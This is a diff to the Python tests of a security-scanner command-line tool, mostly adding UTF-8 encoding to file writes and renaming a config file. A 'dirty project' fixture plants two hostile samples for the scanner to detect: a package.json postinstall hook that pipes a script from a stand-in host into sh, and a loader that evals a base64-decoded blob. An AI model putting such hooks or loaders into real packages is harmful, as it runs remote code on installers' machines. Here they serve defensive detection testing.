@@ -30,7 +30,8 @@ def clean_project(tmp_path):
         "export async function load(id) {\n"
         "  const r = await fetch(`/api/${id}`);\n"
         "  return r.json();\n"
-        "}\n"
+        "}\n",
+        encoding="utf-8",
     )
     return root
 
@@ -41,9 +42,10 @@ def dirty_project(tmp_path):
     root.mkdir()
     (root / "package.json").write_text(
         '{"name":"x","version":"1.0.0",'
-        '"scripts":{"postinstall":"curl -s https://x.example/i.sh | sh"}}'
+        '"scripts":{"postinstall":"curl -s https://x.example/i.sh | sh"}}',
+        encoding="utf-8",
     )
-    (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n")
+    (root / "loader.js").write_text("const p = atob(BLOB);\neval(p);\n", encoding="utf-8")
     return root
 
 
@@ -72,7 +74,7 @@ class TestExitCodes:
         """Actionable by a different person than a scanner error, which is why
         the codes are separate."""
         config = tmp_path / "bad.yaml"
-        config.write_text("scan:\n  sevrity_threshold: high\n")
+        config.write_text("scan:\n  sevrity_threshold: high\n", encoding="utf-8")
         assert (
             run("scan", str(tmp_path), "--config", str(config), "--no-cache")
             == ExitCode.CONFIG_ERROR
@@ -349,13 +351,13 @@ class TestOtherCommands:
         assert run("rules", "show", "NO.SUCH.RULE") == ExitCode.SCANNER_ERROR
 
     def test_config_validate_accepts_a_good_file(self, tmp_path, capsys) -> None:
-        config = tmp_path / "cordon_scanner.yaml"
-        config.write_text("scan:\n  severity_threshold: high\n")
+        config = tmp_path / "cordon.yaml"
+        config.write_text("scan:\n  severity_threshold: high\n", encoding="utf-8")
         assert run("config", "validate", str(config)) == ExitCode.CLEAN
 
     def test_config_validate_rejects_a_bad_file(self, tmp_path, capsys) -> None:
-        config = tmp_path / "cordon_scanner.yaml"
-        config.write_text("scan:\n  nonsense: true\n")
+        config = tmp_path / "cordon.yaml"
+        config.write_text("scan:\n  nonsense: true\n", encoding="utf-8")
         assert run("config", "validate", str(config)) == ExitCode.CONFIG_ERROR
 
     def test_config_explain_shows_effective_settings(self, capsys) -> None:
@@ -381,7 +383,7 @@ class TestErrorHandling:
 
     def test_a_hint_is_offered_where_one_helps(self, tmp_path, capsys) -> None:
         config = tmp_path / "c.yaml"
-        config.write_text("scan:\n  exclud:\n    - a/\n")
+        config.write_text("scan:\n  exclud:\n    - a/\n", encoding="utf-8")
         run("scan", str(tmp_path), "--config", str(config), "--no-cache")
         assert "exclude" in capsys.readouterr().err
 
